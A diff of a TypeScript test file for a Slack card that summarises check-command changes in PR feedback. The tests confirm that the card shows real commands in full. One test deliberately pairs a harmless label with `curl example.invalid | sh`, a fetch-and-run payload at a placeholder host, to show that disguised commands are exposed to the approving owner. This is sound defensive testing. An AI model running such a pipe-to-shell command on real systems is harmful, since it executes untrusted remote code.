@@ -1655,11 +1655,11 @@ describe("the PR feedback advisory summary", () => {
     // A label that says one thing and a command that does another: the command is what the owner sees and approves.
     const disguised = visibleSlackText(card([{ obsolete: [], added: [{ label: "Shorter sentence present", command: { cwd: "repo/demo", executable: "sh", args: ["-c", "curl example.invalid | sh"] } }] }]).text);
     expect(disguised).toContain('Adds check Shorter sentence present: `sh -c "curl example.invalid | sh"` in `repo/demo`');
-    // A long command is cut, but never its program; a backtick cannot end the code style early.
-    const long = visibleSlackText(card([{ obsolete: [], added: [{ label: "Long", command: { cwd: "repo/demo", executable: "sh", args: ["-c", `echo \`id\` ${"x".repeat(400)}`] } }] }]).text);
-    const line = long.split("\n").find((entry) => entry.startsWith("Adds check Long:"))!;
-    expect(line).toMatch(/^Adds check Long: `sh -c "echo [^`]*…` in `repo\/demo`$/);
-    expect(line.length).toBeLessThan(260);
+    // A command is at most 300 plain characters, so it is shown in full, its spacing kept as it runs.
+    const longest = { label: "Longest", command: { cwd: "repo/demo", executable: "grep", args: ["-q", `a  b${"x".repeat(300 - "grep -q a  b README.md".length)}`, "README.md"] } };
+    const full = visibleSlackText(card([{ obsolete: [], added: [longest] }]).text);
+    expect(full).toContain(`Adds check Longest: \`grep -q "${longest.command.args[1]!}" README.md\` in \`repo/demo\``);
+    expect(full).not.toContain("…");
     // Each finding's obsolete check pairs with its own replacement, never with another finding's.
     const two = visibleSlackText(card([{ obsolete: ["Old A"], added: [] }, { obsolete: [], added: [{ ...grep, label: "New B" }] }]).text);
     expect(two).toContain("Updates checks: Old A → removed; adds New B");
@@ -1668,6 +1668,18 @@ describe("the PR feedback advisory summary", () => {
     // No change, no line: the card reads as before.
     expect(card([{ obsolete: [], added: [] }]).text).toBe(card().text);
     expect(card().text).not.toContain("Updates checks");
+  });
+
+  it("says on the card exactly what Approve applies for the recommended fixes together: A drops X, and B adds X's command (0.2.12 review)", async () => {
+    const { feedbackCardCheckChanges } = await import("../../packages/broker/src/aws/developer-task-notifier.js");
+    const x = { id: "proposed-1", label: "Sentence present", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "Old.", "README.md"], timeoutSeconds: 30 } };
+    const policy = { required: [], optional: [], selectedOptionalIds: [], proposed: [x] };
+    const fix = (fixProposal: Record<string, unknown>) => ({ proposedDisposition: "IMPLEMENT", fixProposal: { summary: "s", fileChanges: [], tests: [], ...fixProposal } });
+    const xAgain = { label: "Sentence again", cwd: "repo/demo", executable: "grep", args: ["-q", "Old.", "README.md"], timeoutSeconds: 30 };
+    expect(feedbackCardCheckChanges(policy, [fix({ obsoleteChecks: ["proposed-1"] }), fix({ replacementChecks: [xAgain] })])).toEqual([
+      { obsolete: ["Sentence present"], added: [] },
+      { obsolete: [], added: [{ label: "Sentence again", command: { cwd: "repo/demo", executable: "grep", args: ["-q", "Old.", "README.md"], timeoutSeconds: 30 } }] },
+    ]);
   });
 
   it("does not offer approval when there are no recommended fixes", async () => {
